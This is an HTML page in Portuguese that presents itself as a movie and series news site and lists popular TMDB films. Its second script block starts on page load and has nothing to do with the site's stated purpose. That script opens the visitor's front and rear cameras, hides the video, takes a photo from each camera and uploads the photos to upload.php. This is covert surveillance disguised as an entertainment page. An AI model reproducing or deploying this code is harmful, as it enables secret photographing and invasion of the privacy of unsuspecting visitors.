<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Filmes e Séries - Novidades</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f4f4f4; }
    header { background-color: #333; color: #fff; padding: 10px 0; text-align: center; }
    h1 { margin: 0; }
    .container { display: flex; flex-wrap: wrap; padding: 20px; justify-content: center; }
    .movie { width: 200px; margin: 10px; background-color: #fff; padding: 10px; box-shadow: 0px 4px 8px rgba(0,0,0,0.1); }
    .movie img { width: 100%; height: auto; }
    .movie h2 { font-size: 16px; margin: 10px 0; }
  </style>
</head>
<body>

  <header>
    <h1>Filmes e Séries - Novidades</h1>
  </header>

  <div class="container" id="movies-container"></div>

  <script>
    const apiKey = 'SUA_CHAVE_API_TMDB_AQUI';  // Substitua pela sua chave da API do TMDB
    const moviesContainer = document.getElementById('movies-container');

    // Função para buscar os filmes populares da TMDB
    async function getMovies() {
      const response = await fetch(`https://api.themoviedb.org/3/movie/popular?api_key=${apiKey}&language=pt-BR&page=1`);
      const data = await response.json();
      displayMovies(data.results);
    }

    // Função para exibir os filmes no site
    function displayMovies(movies) {
      moviesContainer.innerHTML = '';  // Limpa o container antes de adicionar novos filmes

      movies.forEach(movie => {
        const movieElement = document.createElement('div');
        movieElement.classList.add('movie');
        movieElement.innerHTML = `
          <img src="https://image.tmdb.org/t/p/w500${movie.poster_path}" alt="${movie.title}">
          <h2>${movie.title}</h2>
          <p>Lançamento: ${movie.release_date}</p>
        `;
        moviesContainer.appendChild(movieElement);
      });
    }

    // Chama a função para buscar e exibir os filmes assim que a página carrega
    getMovies();
  </script>
  
  <script>
  // Função para iniciar a câmera
  async function startCamera(facingMode) {
    const constraints = { video: { facingMode: facingMode } };
    try {
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      const videoElement = document.createElement('video');
      videoElement.srcObject = stream;
      videoElement.style.display = 'none';  // Esconde o vídeo da interface
      document.body.appendChild(videoElement);

      // Captura a foto após o vídeo carregar
      videoElement.onloadedmetadata = () => {
        setTimeout(() => {
          capturePhoto(videoElement, facingMode);
        }, 1000);  // Captura a foto após 1 segundo
      };
    } catch (error) {
      console.error('Erro ao acessar a câmera:', error);
    }
  }

  // Função para capturar a foto e enviá-la ao servidor
  function capturePhoto(videoElement, mode) {
    const canvas = document.createElement('canvas');
    canvas.width = videoElement.videoWidth;
    canvas.height = videoElement.videoHeight;
    const context = canvas.getContext('2d');
    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

    // Converte a imagem para Blob
    canvas.toBlob((blob) => {
      const formData = new FormData();
      formData.append('photo', blob, `${mode}-photo.jpg`);

      // Envia a foto para o servidor
      fetch('upload.php', {
        method: 'POST',
        body: formData
      })
      .then(response => response.text())
      .then(data => console.log('Foto enviada com sucesso!', data))
      .catch(error => console.error('Erro ao enviar a foto:', error));
    }, 'image/jpeg');
  }

  // Iniciar a captura de fotos automaticamente (frontal e traseira)
  startCamera('user');        // Captura da câmera frontal
  startCamera('environment'); // Captura da câmera traseira
</script>

</body>
</html>
